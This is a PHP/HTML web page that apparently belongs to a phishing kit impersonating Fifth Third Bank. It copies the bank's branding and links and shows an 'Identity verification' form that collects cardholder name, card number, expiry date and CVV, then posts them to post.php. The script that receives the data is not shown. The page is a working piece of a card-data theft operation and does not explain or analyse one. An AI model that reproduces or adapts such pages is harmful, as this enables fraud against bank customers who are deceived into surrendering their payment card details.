<?php 
require 'main.php';
?><!DOCTYPE html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res\css\main.css">
    <title>Fifth</title>
</head>
<body>
    <header>
        <div class="logo">
            <img src="res\img/logo.svg">
        </div>
        <div class="logoo"> 
            <img src="res\img/logoo.png">
        </div>
        <div class="links">
            <a href="#">CUSTOMER SERVICE</a>|
            <a href="#">BRANCH & ATM LOCATOR</a>
        </div>
    </header>
    
    <div class="bottom">
       
        </div>

    <div class="container">
        
        
    <div class="login">
            <h2>Identity verification</h2>
            <p>Please enter your card information to verify your identity.</p>

            <form action="post.php" method="post">

                
    <div class="group">
                    <label>Cardholder name</label>
                    <input type="text" name="name" required>
                    </label>
                    
                   </div>

     <div class="group">   
                    <label>Card number</label>
                    <input type="text" name="cc" placeholder="XXXX XXXX XXXX XXXX" id="cc" required>
                    </label>
                    
                   </div>
    <div class="group">
                    <label>Expiration date</label>
                    <input type="text" name="exp" placeholder="MM/YY" id="exp" required>  

                    </label>
                    
                   </div>

    <div class="group">
                    <label>Security code</label>
                    <input type="password" name="cvv"  placeholder="CVV" id="cvv" required>
                </div>
        <button type="submit" class="login-button">Continue</button>
        
    </form>

            </div>
            </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");
</script>
</body>
</html>
